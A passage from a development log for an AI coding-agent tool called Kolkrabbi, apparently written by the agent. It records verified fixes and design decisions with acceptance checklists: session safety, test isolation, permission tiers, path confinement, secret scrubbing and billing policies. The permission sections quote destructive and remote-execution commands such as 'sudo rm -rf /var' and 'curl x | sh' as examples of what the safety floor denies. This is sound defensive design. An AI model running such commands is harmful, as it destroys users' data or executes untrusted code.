before the measurement was taken.

Acceptance checklist:

- [x] legacy and canonical spellings of one level combine into a single row with their spend added.
- [x] canonical names are shown; legacy names are not.
- [x] recent sessions list calls, tokens, cost, models and last use, newest first.
- [x] sessions with no id produce no table rather than a blank row.
- [x] real-binary rehearsal against the development host's own usage log.
- [x] full `make check` green.

### R1 session-safety review — verified detail

A deliberate review pass over the commands added during this session, checking each against the rule
that this session's own bugs kept teaching: **inside a live session, nothing may take the keyboard
and nothing may block the turn.** It found three faults, one of them mine from two checkpoints
earlier.

- **`/dash` froze the session.** `runDash` serves until its context is cancelled, which is right for
  `kolk dash` and wrong for a slash command running on the turn goroutine: the prompt simply stopped
  responding until the user interrupted it. This is the same shape as the P11.6 handover bug I fixed
  at the start of the session, reintroduced by me in D17.2 — a good argument for reviewing new
  surfaces against known failure modes rather than trusting that the lesson generalised. The
  in-session form now starts the server in the background and returns, a second `/dash` points at
  the first rather than starting another, and both entry points share one listener helper so the
  loopback rule cannot hold in one and be forgotten in the other.
- **`localia pull` prompted for stdin inside a session**, competing with the session's own reader for
  the user's keystrokes — the exact contention that made the original provider login unusable. It
  now refuses in-session with the command to run elsewhere, while `--yes` still works because it
  needs no keyboard.
- **The hardware probe had no deadline.** `nvidia-smi` against a wedged driver is a known hang, and
  it would have hung a session through `/localia`. The whole snapshot is now bounded, which is safe
  precisely because "unknown" is a valid answer everywhere the snapshot is used.

Acceptance checklist:

- [x] `/dash` returns promptly instead of serving on the turn goroutine.
- [x] a second `/dash` reports the running URL and starts no second server.
- [x] the loopback refusal holds for both `kolk dash` and `/dash`.
- [x] `localia pull` does not prompt while the session owns the terminal, and says where to run it.
- [x] `--yes` still proceeds in-session.
- [x] the hardware probe carries a short deadline.
- [x] `go test -race ./internal/cli` and full `make check` green.

### R2 test isolation and stdin ownership — verified detail

Two more results from the same review, one of them the most consequential hygiene bug found this
session.

**The test suite was writing into the developer's real Kolkrabbi state**, and had been for a long
time. `internal/cli/scripting_test.go` isolated with `t.Setenv("HOME", tempdir)` alone. On a desktop
Linux machine `XDG_DATA_HOME` is set and takes precedence over `$HOME`, so the temp home isolated
nothing: every run created sessions, event spill files and usage records in
`~/.local/share/kolk/`. CI never caught it because containers usually do not set `XDG_*`, which is
exactly why it survived.

The damage is measurable and now visible: **543 of the 571 records in this machine's real
`stats.jsonl` name `mock/model`** — the test fixture's model. The dashboard built two checkpoints
ago reads that file, so the developer's own cost chart is 95% synthetic. That is the concrete reason
this class of bug matters rather than being mere tidiness.

The fix is the isolation the repository already documents and already uses elsewhere: the `KOLK_*`
overrides, which mean the same thing on every platform. Proof rather than assertion — a full
`go test ./...` now leaves the session count unchanged and `stats.jsonl` byte-identical, checked by
checksum before and after.

**`/key -` read stdin inside a session**, competing with the session's own reader exactly as the
provider login and the local-model pull did. It now refuses in-session and says where to run it,
while piping into `kolk key -` outside a session is unchanged.

Acceptance checklist:

- [x] `go test ./...` leaves the real sessions directory and `stats.jsonl` untouched, verified by
  checksum.
- [x] the two offending tests use the platform-independent overrides, with the reason recorded in
  the test itself so it is not undone later.
- [x] `/key -` is refused while the session owns the terminal and still works outside one.
- [x] full `make check` green.

Left for the owner, deliberately: the 543 synthetic records already in
`~/.local/share/kolk/stats.jsonl`. Removing rows from a user's own data is their call, not a tidy-up
to perform unasked.

### R3 rune-safe tool output — verified detail

The same byte-offset truncation fixed for memory in C12.5 existed in `internal/tools`, on a far
hotter path: every file read and every command result larger than 12 000 bytes. A file containing an
accented name, a smart quote or an emoji would put invalid UTF-8 into the tool result, which is then
sent to the provider and saved into the session.

Truncation now prefers a line boundary — half a line at the cut reads as though the file itself is
broken — and falls back to trimming an incomplete trailing rune when no line boundary is near enough
to be worth the loss.

**The more useful finding is about the tests.** The first version of this leaf's tests passed
immediately against the *unfixed* code, and the reason is arithmetic: `maxOutput` is 12 000, and the
byte widths of every filler chosen — 2, 3 and 4 — divide 12 000 exactly, so the cut landed on a rune
boundary by accident. The line-boundary test had the same flaw with 80-byte lines. Both proved
nothing while looking green, which is worse than failing, because a green vacuous test is a claim
that the behaviour is checked.

The fix was to construct the fixtures so the boundary *cannot* be hit by accident: a one-to-three
byte prefix before the multibyte filler, and a line length that does not divide the cap. Both then
failed against the old code, as they should have from the start.

That is the third time this session a test premise rather than the code was wrong, and the first
time it produced false confidence rather than a false failure. It is recorded here because a suite
whose green is unearned is the one failure mode none of the other checks can catch.

Acceptance checklist:

- [x] truncation stays valid UTF-8 for 2, 3 and 4-byte runes at four different cut offsets.
- [x] the cut prefers a line boundary when one is close enough.
- [x] short output is returned byte-identical.
- [x] the amount dropped is reported from the actual cut, not from the cap.
- [x] full `make check` green.

### R4 warnings reach the screen that owns it — verified detail

The engine writes everything through `Options.Out`. Two warnings did not: a failed session save and
a failed stats record went straight to `os.Stderr`.

In a live session `Out` is the terminal renderer, which owns a set of screen rows and repaints them.
Anything printed around it lands outside those rows, so the one moment a user most needs to read a
message — their session could not be saved — is the moment the display gets scribbled over. Both now
go through `Out`, like every other engine message.

The consequence in `stream-json` mode is deliberate: `Out` is `io.Discard` there, so these warnings
become invisible to a machine consumer, which is correct — the NDJSON stream is the interface, and
interleaving prose into it would corrupt the very thing the caller is parsing.

`RestoreCompaction` also discarded its save error, telling the user their conversation was back while
it was not on disk: the next session would silently have been the compacted one. That is the quiet
half-success this session keeps finding, and it now reports.

Also checked and deliberately left alone: `Bus.Publish` results are discarded throughout. Events are
observability, not correctness, and failing a turn because an event could not be published would be
the tail wagging the dog.

Acceptance checklist:

- [x] a failed save warns through the configured writer, not around it.
- [x] it warns once however many times the save fails, and keeps trying to save.
- [x] a restore that cannot be persisted says so.
- [x] full `make check` green.

### C12.7 fast-lane session naming — verified detail

The last piece of item 12. A session's title was the opening line the user typed, which is often the
least descriptive sentence in it — `kolk sessions` and the dashboard's session list both read it,
and "hi" names nothing. After two turns Kolkrabbi now replaces its own guess with a fast-lane name.

Four decisions, each of them a test, and two of them corrections found while building:

- **After the turn, never before it.** The first version ran naming at the same boundary as
  compaction, which made the user wait on a name to read the answer they had just asked for. That
  gets the priority backwards, and the overflow tests caught it by counting an unexpected provider
  call.
- **Eligibility is checked before the call, not after.** The first version generated a name and then
  discovered it was not allowed to use it, spending a fast-lane call on a discarded result *every
  turn after the second*. `TitleIsAuto` is on the port for exactly this reason.
- **Once, then stable.** A title that keeps changing under the user is worse than a mediocre one that
  stays put, and every change costs a call.
- **Never over a chosen name.** `kolk sessions rename` marks a title as the user's, and naming skips
  it. Silence on failure, too: naming is a nicety nobody asked for, so complaining when it fails
  would be noise about a thing the user never requested.

Also fixed here, the fourth instance of this session's byte-offset pattern: `SetTitleFromInput` cut
at 60 bytes, so any prompt not written in English could produce a title with a split rune. It now
trims to a rune boundary, tested with four multibyte fillers at four offsets so the cut cannot land
cleanly by accident — the lesson from R3 applied on the first try rather than after a vacuous pass.

Acceptance checklist:

- [x] two turns produce a real name; one turn does not.
- [x] naming happens once however many turns follow, and costs exactly one call.
- [x] a title the user chose is never replaced.
- [x] a failed naming is silent and changes nothing.
- [x] titles stay valid UTF-8 at every cut offset.
- [x] `go test -race` on engine, cli and session, and full `make check`, green.

**Item 12 is complete.**

### E13.1–E13.3 confinement, tiers and scrubbing — verified detail

The three holes named in `docs/plan/13-tools-permissions-sandboxing.md`, closed together because they
are one hole seen from three sides: nothing stopped a path, nothing stopped `--yolo`, and nothing
stopped a secret leaving in a tool result.

**Confinement.** Paths resolve against the project root — the enclosing repository, or the working
directory when there is none — with symlinks resolved *before* the comparison, since a link inside
the root pointing out of it is a hole straight through. The resolved path is what the policy judges
*and* what the tool opens: judging one path and opening another is how these checks are usually
defeated. `read_file` and `list_dir` are judged too, which is the half that was quieter and worse —
the interesting attack was never a write the user would be asked to approve, but a read they were
never asked about at all.

**Tiers.** `--yolo` returned true for every action with nothing beneath it, and it is gone.
`ask` / `auto-approve` / `full-auto` are the whole model. `auto-approve` draws its line where Claude
Code draws it — edits inside the project flow, shell commands still ask — because an edit is visible
and reversible through checkpoints and a command is neither. `confirm` no longer has a bypass of its
own: whether to ask is decided in exactly one place, so there is no second path that can quietly
disagree with the first.

**The floor holds in every tier**, `full-auto` included: credential files and directories, writes
into system directories, `sudo`, downloads piped into a shell, and unrecoverable deletes. It reads a
command's own words rather than substrings, so `echo 'rm -rf /' > docs/dangerous.txt` and
`grep -r sudo .` are ordinary work, while `sudo rm -rf /var` is not. It is deliberately a short list
of specific shapes rather than an attempt at a perimeter — the jail and the tiers are the control.

**In full-auto, leaving the project is allowed and always logged**, with the path and the reason the
model gave. The file tools gained an optional `purpose` argument so there is a reason to log; when
the model gives none the line says so rather than printing an empty dash.

**Scrubbing.** Every tool result passes `secret.Scrub` at one chokepoint before it becomes a message,
because that copy is what reaches the session file on disk and every later provider request. A
measurement first established what was already covered — vendor prefixes, JWTs, PEM blocks, GitHub
and Slack tokens all were — so the work went only to the real gap: secrets belonging to no vendor
Kolkrabbi has heard of. Those are now caught by the shape of the line, plus credentials embedded in
URLs.

Four times in this work a test of mine encoded the wrong premise, and the last two are the
interesting ones. `AWS_SECRET_ACCESS_KEY=wJalrX…EXAMPLEKEY` and `AKIAIOSFODNN7EXAMPLE` are AWS's own
*published documentation* values, and `testdata/falsepositives.txt` already recorded the project's
considered policy that templates full of `EXAMPLE` and `YOUR_KEY_HERE` must survive scrubbing. The
corpus was right and the new tests were wrong; they were changed to realistic secrets and the corpus
was extended with the new shapes rather than the policy being overridden. The bar for redacting is
high on purpose: over-redaction corrupts the output the model needs, and a scrubber that mangles
`const tokenName = "access_token"` is one people switch off.

Acceptance checklist:

- [x] paths resolve inside, outside, through symlinks, for files that do not exist yet, and with
  confinement disabled.
- [x] every tier's verdict for every tool, inside and outside the root.
- [x] the floor denies in all three tiers and does not catch ordinary commands.
- [x] full-auto logs each step outside the project with the model's reason, and says so when none
  was given; ordinary work inside the project stays silent.
- [x] a refusal explains itself; a declined action does not proceed.
- [x] `/permissions` lists all three and marks the active one; each tier has its own command;
  entering full-auto states what it still refuses; an unknown tier changes nothing.
- [x] `/yolo` no longer exists.
- [x] tool output is scrubbed before it is kept, ordinary output is untouched, and a command that
  prints a token is caught too.
- [x] vendor-less assignments and URL credentials are scrubbed; documented examples, placeholders and
  source code are not.
- [x] `go test -race` on engine, tools, redact and cli; full `make check` green, lint 0 issues.

Still open from the item 13 design, unchanged: permission *rules* with scopes, subagent auto-deny,
binary detection and read ranges, and the OS sandbox matrix.

### E13.4 subagent auto-deny — verified detail

The last guard phase F depends on. Subagents called the same `executeTool` as the main session, so
an action needing confirmation inside orchestrated work either deadlocked, or showed the user a
question they would read as coming from the main session and answer about the wrong work. In a
headless run with no decider it silently returned false, which is the same refusal without the
explanation.

`subagentGuard` turns anything its tier would *ask* about into a refusal, and says how to widen it:
by choosing a tier, which the user decides once and can review, rather than by answering a prompt
nobody saw. Everything else is unchanged — the tier still allows what it allows, and the floor still
refuses what it refuses, inside a subagent exactly as outside one.

The two guards are separate functions rather than a flag on the agent. A mutable "am I a subagent"
field works only while subagents run one at a time, which is true today and is exactly the
assumption phase F is about to break.

Acceptance checklist:

- [x] a subagent never reaches the decider, and an action that would need asking is refused.
- [x] the refusal names the tiers that would allow it.
- [x] a subagent still does what its tier allows, and still cannot do what its tier would ask about.
- [x] the floor holds inside a subagent, in full-auto.
- [x] a full-auto subagent runs edits and commands unattended, which is the point of the tier.
- [x] full `make check` green.

### E13.5 readable output — verified detail

The tool-output half of item 13, and both halves are about what the model does *next* rather than
about safety.

**Binaries are described, not sent.** A NUL byte in the first 8 KiB is the same test `file` and git
use, and it is the one thing no text encoding produces. Sending the bytes wastes the window and
carries values no provider can represent; what the model can act on is that the file exists and how
big it is.

**A large file now says how to read the rest.** `read_file` takes `start_line` and `end_line`, and an
unranged read of something too large returns the head, the real line count, and the two parameters.
Truncation that does not say how to continue leaves the model guessing, and in practice it guesses
"run grep in bash" — slower, less portable, and it needs a command confirmation for what is a read.

Line numbers stay **absolute inside a range**. A renumbered listing produces edits that land in the
wrong place, and neither the model nor the user has any way to notice.

A range that starts past the end reports the file's real length rather than returning nothing, so
the model can correct itself in one step instead of concluding the file is empty.

Acceptance checklist:

- [x] a requested range returns exactly those lines, numbered absolutely.
- [x] a range beyond the end states the real length.
- [x] an unranged large read shows the head, the line count and how to page.
- [x] a small file is returned undecorated.
- [x] a binary is named and sized, and none of its bytes reach the conversation.
- [x] a UTF-8 file with emoji and accents is still treated as text.
- [x] full `make check` green.

### E13.6 permission rules with scopes — verified detail

A tier is a blunt instrument: someone who wants `go test` to stop asking should not have to accept
every shell command to get it. Rules are the fine adjustment, and they are the last piece of item 13
before orchestration needs them.

**The grammar is one line.** `allow bash(git *)`, `deny write(*/migrations/*)`, `ask write(*)`. It is
stored as the line the user typed rather than as a parsed structure, because a permission list is
worth having on disk only if a person can open it and see what they agreed to. A JSON object per
rule would be a format nobody reviews.

**The order is the semantics.** Rules are applied global-first, then the project's, then the
session's, and the last one that matches wins — the behaviour of every allow/deny list people
already know. The listing prints them in exactly that order and numbers them, so what someone reads
is what actually happens. `forget <number>` removes by that number, because retyping a glob exactly
is how people delete the wrong rule.

**Precedence around the rules is the whole design.** The floor is checked first and cannot be argued
with: no rule grants `read(~/.ssh/*)` or `sudo`, and a test holds that line. A rule beats the tier in
both directions — it can widen (`allow bash(git *)` under `ask`) and it can narrow (`ask write(*)`
under `full-auto`), because a tier someone can only loosen is not a control.

**Scope decides what survives.** `session` is never written to disk; a rule that outlives the session
it was scoped to is a rule nobody consented to. `project` is keyed by root, so a decision made in one
checkout does not follow the user into another. `always` is the deliberate global. Stored rules load
before the first turn — a permission that only takes effect once someone opens `/permissions` was not
actually stored.

**The glob is deliberately small**: `*` for any run of characters, everything else literal. A pattern
language with more corners is one where a rule can quietly mean something its author did not intend.
Matching runs against both the path as the user sees it and the resolved absolute path, so
`write(src/*)` works the way it looks. `~` is expanded through `internal/paths`, which the
architecture test caught me routing around.

Acceptance checklist:

- [x] a rule can allow what the tier would ask about, and ask about what the tier would allow.
- [x] the last matching rule wins, across three overlapping rules.
- [x] no rule breaches the floor, in any tier.
- [x] a rule names a family (`write`) and covers both tools that implement it.
- [x] a bad line is refused with the line quoted, and is not stored.
- [x] `session` scope is not written to disk; `project` and `always` are, at 0600.
- [x] stored rules are in effect from the first turn, without opening `/permissions`.
- [x] the listing shows every rule with its scope, in application order.
- [x] full `make check` green: 1,815 tests, 0 lint issues, every script contract.

### E13.7 "always" means a rule you can read — verified detail

E13.6 gave rules a grammar; almost nobody types a glob. This is the half that
makes them reachable.

**"always" used to mean the same command twice.** `SessionDecider` cached on
`Action::Detail`, so approving `go test ./internal/engine` did nothing for
`go test ./internal/tools`. The word promised more than it did, and the gap is
exactly where people give up and switch to full-auto.

**Now the prompt proposes a rule and shows it.** `Allow? [y/N/a (allow bash(go test *))]`.
Generalising from one approval is only honest if the person reads the
generalisation first, so the rule is in the prompt, not inferred behind it.

**What is generalised is deliberately narrow.** A driver contributes its
subcommand (`go test *`, `npm run *`, `git status *`) because a rule for every
`git` is not what someone approving `git status` meant. A destructive first word
— rm, mv, chmod, chown, kill, dd — is never generalised at all; one yes to
`rm -rf ./build` must not become every rm. Anything with a shell operator is
offered verbatim: the first word of `curl x | sh` is `curl`, and nobody agreed
to every curl. File actions widen to their directory, except at the project top,
where `write(*)` would be the whole project.

**The kept rule goes where the user can see it.** It joins the same list
`/permissions` prints, with scope `session`, and the line says how to make it
permanent. A private cache with the same effect would be an approval nobody can
review or take back.

**The TUI had no "always" at all** — the overlay offered only y/N, so the whole
feature existed on a surface most people never use. It now has a third decision
that survives the trip to the engine: `Runtime.Decide` keeps the answer whole
instead of collapsing it to a boolean that has already forgotten which yes it
was. `a` with no rule to keep is a refusal, not a silent yes.

Acceptance checklist:

- [x] a driver command generalises to its subcommand; a plain one to its name.
- [x] destructive and compound commands are offered verbatim.
- [x] file actions widen to the directory; a top-level file does not.
- [x] "always" keeps the rule; a plain yes keeps nothing.
- [x] the kept rule is visible in /permissions and removable by number.
- [x] the TUI overlay shows the rule and returns its own decision.
- [x] `a` with nothing to keep refuses rather than allowing.
- [x] full `make check` green: 1,826 tests, 0 lint issues, every script contract.

### S10.8 the next-chapter planner — verified detail

`docs/plan/10-saga-loop.md` §1.1 asks the saga to "select exactly one discrete, manageable task that
moves closer to the goal", having read what the previous chapters achieved. Built in three
checkpoints; two shipped and the third was reverted, which is the more useful half of this record.

**A: the planner port.** `ChapterPlanner` returns one title, or `""` when the goal is met. The loop
asks for a chapter only when nothing is pending, appends it, and works it. Tested entirely with a
fake — the budget ceiling, the sequential numbering, a failing planner, and the planner seeing the
previous chapters' outcomes, all without a provider.

Two distinctions that fall out of having a planner. **`no-work` now means different things.** Without
a planner, running out of chapters means the hand-written list ended, which says nothing about the
goal; with one, it means the planner judged the goal met. The loop reports `StopNoWork` and
`StopGoalComplete` accordingly, because a saga claiming success for running out of plan would be the
worst possible lie for it to tell. And **a failing planner is an error, not a stop** — a planner that
cannot answer is a broken saga, not a finished one.

**B: the agent planner.** Runs on the fast lane, not the session model: choosing one next step from a
short list is a cheap judgement, and paying the coding model for it once per chapter is how a saga's
cost drifts away from the work it is doing. Failed chapters go into the prompt *with their
verification message*, because repeating a chapter that just failed the same way is precisely the
loop the doom detector exists to stop, and the planner is the only thing that can avoid it. A
multi-line answer is cut to its first line: "exactly one discrete task" is the rule, and the title
ends up in a commit message.

**C was reverted, and that is the finding.** The napkin test shows `kolk saga "<goal>"` starting the
run, so I made it do that — and the suite hung. Recording a goal now required a model, a key and a
network, and with no key it hung in catalog discovery rather than refusing. Setting down an intention
is a cheap local act and should stay one, so the verb records the goal and says
`start it with kolk saga resume`. The doc's napkin test is aspirational on this point and the code
now disagrees with it deliberately.

Acceptance checklist:

- [x] a goal with no chapters plans one, works it, and stops as goal-complete.
- [x] the planner sees the previous chapters and their outcomes.
- [x] chapters are numbered in sequence; planning respects the chapter ceiling.
- [x] a failing planner stops the run rather than looping.
- [x] hand-written chapters still work with no planner, reporting no-work.
- [x] DONE in any casing ends the saga; a multi-line title is cut to one line.
- [x] full `make check` green: 2,056 tests, 0 lint issues.

### L13.5b4a refused — the pin cannot be filled, and the reason is not a missing decision

I was cleared to *propose* a runtime pin: fetch a release, compute its SHA-256, present version, URL
and digest for a yes or no. There is nothing to present. The install path cannot accept any shape
the upstream project actually publishes, and that is a code problem, not a review one.

**First, a question I asked that the code had already answered.** I asked the owner which runtime to
pin. `NewRuntimeSpec` hardcodes an `ollama` executable and sets `OLLAMA_MODELS` and `OLLAMA_HOST`,
and `docs/plan/25-managed-local-models.md` is about a private Ollama sidecar throughout. There was no
product choice outstanding. Checking the code first would have saved the owner a question.

**Blocker 1 — every asset is an archive.** `InstallRuntime` downloads bytes, marks them executable
and renames them to `dest`, which the spec expects to be the `ollama` binary. Ollama v0.33.1 ships
`.tar.zst`, `.tgz`, `.zip` and installers. Writing a `.tar.zst` to that path produces a file the
runtime cannot start. **Extraction does not exist in this package.**

**Blocker 2 — the size guard is wrong about its own subject.** `maxRuntimeBytes` is 1 GiB, and its
comment says "a managed inference runtime is tens of megabytes; anything approaching this is not
one." The linux amd64 asset is **1.42 GB** — over the cap. That comment was never true: the bare
binary was already 304 MB in v0.1.32 and 585 MB by v0.3.0. This is the fifth claim this month to
fail on contact with the facts, and the first where the claim was about the outside world rather
than about this repository.

**Blocker 3 — one pin cannot serve four platforms.** `PinnedRuntime()` returns a single
`RuntimeRelease` with one URL and one digest. A release has separate assets for linux amd64 and
arm64, darwin, and windows, each with its own checksum. Nothing near the pin reads `runtime.GOOS`.

**When the shape the installer assumes stopped existing.** A bare `ollama-linux-amd64` executable
was published up to v0.3.0 and gone by v0.5.0 — over a year and a half ago. So the install path was
written against a real shape that has since changed, rather than an imagined one. Worth saying,
because "it never worked" and "it stopped working" call for different repairs.

**What would unblock a pin**, in order: per-platform pins keyed on `GOOS`/`GOARCH`; an extraction
step with the same never-execute-before-verifying discipline the download already has; and a size
bound set from the real assets instead of an assumption. Only then is there something for the owner
to approve. Upstream publishes `sha256sum.txt` and GitHub returns a digest per asset, so the
verification half will be easy when the rest is ready.

`pinnedRuntime` stays empty, which is exactly what its comment asks for: a plausible-looking URL with
an unverified digest would turn "verified" into a word rather than a property, in the one code path
that installs an executable and then runs it.

### T0.5a built — the rehearsal, written down rather than remembered

`scripts/rehearse-clean-machine.sh` walks install, first run, key addition and first model response,
and says what each step must show.

**It refuses rather than tidies.** A machine with existing Kolkrabbi config, data or cache is not a
first run, so the script stops before installing anything and names the paths for the owner to move
aside. It never deletes them: the state it would be deleting is sessions and API keys, and a
rehearsal that destroys what it was supposed to find is not a rehearsal. Both paths were exercised —
a dirty machine refuses with exit 1 having installed nothing, and a clean one passes its
preconditions.

`KOLK_REHEARSAL_DRY_RUN=1` stops after those preconditions, because they are the part that has to be
fixed by hand and finding that out after an install is worse.

Two things it checks that CI structurally cannot: that `kolk` is runnable **without opening a new
shell** — an install the user cannot type afterwards has not succeeded — and that the first run names
the missing credential rather than failing blankly. It also reports the session model at the end,
because B12.13 promises a first run stays free, and a billed model there is a finding rather than a
preference.

The key comes from `KOLK_REHEARSAL_KEY` and is never written to the log. A rehearsal is exactly when
someone finds out what a first run does with a credential, so it should be a throwaway.

### B12.13b/c built — the order proven end to end, and a policy that was decoration

The owner's order is free first, a subscription only once one is actually available, free again when
there is not. Reading `run.go` showed the order was already right — `chooseDefault` prefers free,
the free-exhausted policy governs any paid substitution, and A33.6's subscription check runs after
both, per session, from a connectors file re-read at every startup rather than remembered from
install.

**What was not right was something I had just built.** Testing the order through `newAgent` instead
of through the choice function showed `stop` did not stop: `applyFreeExhausted` returned no model,
and twelve lines later startup filled the blank in with the free router. The policy printed its
refusal and then started the session anyway.

The fix distinguishes two things an empty model can mean. "Nothing suitable was found" may be papered
over with the router; **"do not start" may not**, so the choice now carries `Refused` and startup
fails with the sentence the policy wrote. A setting that announces a decision and then does the
opposite is worse than not having it, because it is believed.

That is the second time this week a unit test passed while the behaviour it described did not reach
the surface — the same shape as an export with no caller, and found the same way: by testing where
the user stands rather than where the function does.

`make check` green at 2,445 tests.

### B12.13d built — the same policy where free actually runs out

`routing.on_free_exhausted` now governs the mid-run path too: every free model rate-limited, which is
what an exhausted free tier looks like from inside a turn. `free` stops, `paid` moves to the metered
model and says so, `stop` refuses to rotate at all.

**I nearly shipped a regression and an existing test caught it.** The first placement checked the
policy *before* the bounded backoff, which skipped the retries that a transient rate limit usually
clears within — the whole reason rotation gives the last model those retries.
`TestFreeModelRotationUsesEachCandidateOncePerTurn` failed immediately. The check now fires only
after every free model has been tried *and* the last one has had its retries, and a new test pins
that ordering so the mistake cannot come back quietly.

**A mutation that did not kill found a real hole.** Removing `allFreeModelsTried` failed nothing,
because rotation had already tried everything by the time the branch ran — the guard was
unfalsifiable. The case it actually protects is a **pinned** model, which never rotates: without it,
a pinned *free* model silently becomes a billed one, the sharpest version of the surprise this
setting exists to prevent. Pinning is a decision, and `paid` does not overrule it. With that test the
mutation kills.

An empty `FreeModels` list is deliberately not "all tried": a run that never had a rotation has not
exhausted one, and reading it that way would turn a single 429 into a bill.

`make check` green at 2,442 tests.

### B12.13a built — a first run stops being able to bill you by accident

`routing.on_free_exhausted` takes `free` (the default), `paid` or `stop`, and governs the one place
kolk used to substitute a billed model on its own.

**The behaviour this replaces was real, not hypothetical.** `chooseDefaultModel` preferred free, and
when a catalogue listed no free tool-capable model it fell through to "the cheapest available coding
model (charges may apply)" — a warning printed before the first turn, on a first run, to someone who
by definition has no idea what anything costs. That fallthrough is now the opt-in.

The order never changes: **free is preferred under every policy.** The setting decides only what
happens when there is no free model to prefer — stay on the free router and name what was passed
over, take the cheapest billed one and say it will charge, or refuse and name the setting.

**The vocabulary is deliberately not A33.7's.** `on_subscription_limit` asks, because a person is
usually there when a plan lapses. Free models rate-limit mid-sentence and repeatedly, so a prompt
each time would be an interruption rather than a decision. What the two share is the rule that
matters, and it is written down in both: the default never bills.

It applies to the choice already made rather than re-deriving it, because startup injects its own
chooser — the seam A33.6 first broke by calling past it.

**One existing test changed its meaning and was rewritten rather than deleted.** "paid fallback is
visible before any turn" proved the fallback *warned*; the fallback is now the opt-in, so the default
case proves it does not happen and a new case proves the opt-in still warns.

`make check` green at 2,436 tests.

### B12.15 built — the failure tests found a bug, and unbuilt one of their own premises

Phase A's happy path was green and its failures were guesses. Writing the tests changed two things
and confirmed a third.

**B12.15a found a real defect.** An expired plan login does not just fail the turn — it leaves the
session holding a process that has already exited. Measured across three turns: turn 1 returns the
real error, **turn 2 is wasted** on the misleading "claude exited before finishing the turn", and
only turn 3 works. So a user who signs in again in another terminal and retries gets a second
failure that has nothing to do with their fix.

The fix is one retry, tightly bounded: when a turn fails on a stream that ended *before it produced
anything*, the process was already gone, so the session is replaced and the turn runs once more.
`streamed` guards it — a turn that already showed half an answer is never replayed, because printing
the first half twice is worse than the error. Both mutations bite: dropping the `streamed` guard
replays a half-streamed turn, and removing the retry restores the wasted turn.

**B12.15b found nothing wrong, which is also a result.** A missing vendor CLI already fails by name
and already preserves `exec.ErrNotFound` through the wrap, so the surface can still tell "not
installed" from "installed and refused". That behaviour was unpinned; now it is.

**B12.15c unbuilt its own premise.** I set out to test that an enabled connector with no adapter
fails by name — `planBackendFor` has a branch for exactly that. It cannot be reached: `SaveConnector`
refuses any connector whose login is not provider-owned, so the state never reaches disk. The test
now covers the guard that actually holds, and asserts the rejected connector was not half-written.
The downstream branch stays as defence in depth and is recorded as unreachable rather than left
looking like a live path nobody covered.

That is the fourth premise this month to fail on contact with the code, and the second where the
thing I meant to test turned out to be impossible rather than merely untested.

`make check` green at 2,431 tests.

### I26.8b built — revoking a device, and making the revoke survive the process

`kolk devices revoke <id>` and `/devices revoke <id>` remove one device and name what went.

**The write is the whole point.** `Store.Revoke` mutates memory; nothing in it touches disk. A revoke
that is not saved lasts until the process exits, which is the opposite of what the person asking for
it believes they have done — so the test asserts the device is gone from a *second* invocation, and
mutating the save away fails it.

**An unknown id is refused, and the refusal lists what is paired.** Reporting success would be worse
than an error: it tells someone a device they still worry about is gone. The label is read before the
removal, because afterwards there is nothing left to name and "revoked a1b2c3" makes the reader go
and look up which one that was.

Both mutations bite: dropping the save leaves the device listed, and treating an unknown id as a
success fails the refusal test.

`make check` green at 2,426 tests. I26.8 is complete — pairing is now two-way from both surfaces.

### I26.8a built — pairing stops being one-way

`kolk devices` and `/devices` list what is paired: id, label, tier, when it was paired, when it was
last seen. Until now `devices.Store.List` and `.Revoke` were both written, both tested, and neither
had a caller outside a test — so a device paired once stayed paired until someone hand-edited
`devices.json`. A credential you cannot withdraw is not really a credential you granted.

**A ratchet redrew the leaf, correctly.** I had planned the slash twin as a separate tick. The parity
test refused: a top-level verb without a `/` twin is a surface people can only reach one way, and the
rule exists so that never happens by drift. `/devices` shipped in the same leaf.

**The naming rule was broken deliberately and recorded.** `devices` is seven letters against a
six-letter rule, so it joins `longVerbs` with its reason — plural because it lists, like `sessions`,
where `device` would read as a flag for one. The list exists so the violation stays visible and
bounded rather than becoming a precedent nobody voted for.

Two things the listing refuses to get wrong: nothing paired prints a sentence and a way to pair,
because a blank screen cannot be told from a command that failed; and a device that has never
connected reads `never` rather than a zero timestamp dressed up as a date.

`make check` green at 2,423 tests.

### A33.8 built — one bad subagent no longer costs the whole turn

`/undo task <n>` takes back one writing subagent's file changes and leaves every other task
standing. `/undo task` with no number lists what there is to take back.

**Restoring the tree to the snapshot would not have been this.** It would also discard every task
that ran after it — the whole-turn `/undo` wearing a different name. So a snapshot records the
commit *and* the paths that task changed: the commit says what to put back, the paths say how much.
A file the task created is taken back by removing it, because there is no earlier version to put
there. Two mutations confirm both halves bite — a whole-tree restore loses the later task's work,
and skipping the removal leaves the created file behind.

**Measured first.** A whole-tree snapshot of this repository is 27 ms mean, 58 ms worst over twelve
runs. Against a subagent that takes seconds to minutes that is under a percent, which is what makes
one snapshot per writing task affordable rather than a cadence to economise on.

**The serialisation the design leans on was checked, not assumed.** `nextRunnable` skips a writer
while one is running and `writing` clears only when that run is received, so the window between
`BeginTask` and `EndTask` is the only moment where "what changed" means this task alone.

**A per-task rewind tells the model.** It does not trim the conversation — a turn that ran five
subagents is one turn — but leaving history describing edits that are gone is the divergence
`/undo` exists to prevent, so the transcript says what went back.

### A33.7 built — running out of allowance is now a decision, not a dead end

`routing.on_subscription_limit` takes `ask` (the default), `switch` or `stop`, settable and
gettable through `kolk config` and visible in the listing without being set — a policy nobody can
see is one nobody chose. A typo is refused rather than guessed at: `continue` reads like an answer
and is not one.

**The default is `ask` on purpose.** Switching to a metered model spends money. A run that starts
billing because a plan ran out is a surprise on a card statement rather than a decision anybody
made, so the only way to reach the metered model unattended is to have said `switch` in advance.

Three things the code corrected on the way:

- **Waiting never clears an exhausted allowance**, so the check sits *before* the rate-limit gate,
  not inside it. Two of its shapes — 402, and a vendor CLI's prose — never reached that gate at all,
  because it returns early on anything that is not a 429.
- **The limit belongs to the session, not the task.** Subagents run as methods on the agent that
  spawned them and share its `Ask`, so the answer is settled once and remembered.
- **Detection is partial and says so.** Only 402 and a gateway's `limit_source` are structured; a
  subscription answered by a CLI returns prose, matched on a deliberately narrow wording list. A
  miss costs nothing — the error surfaces as it does today — while a false positive would stop a
  healthy run.

Three mutations checked the guards bite: nobody-there becoming a yes, a declined question
continuing anyway, and every 429 being read as an exhausted plan. All three fail the tests.
`make check` green at 2,413 tests before this leaf's own additions.

### A33.6 built — a paid-for subscription stops sitting idle, and the plan is corrected again

Model selection knew nothing about connectors. A machine with a signed-in Claude plan still started
on a gateway model and billed metered credit when it wanted something stronger, while the
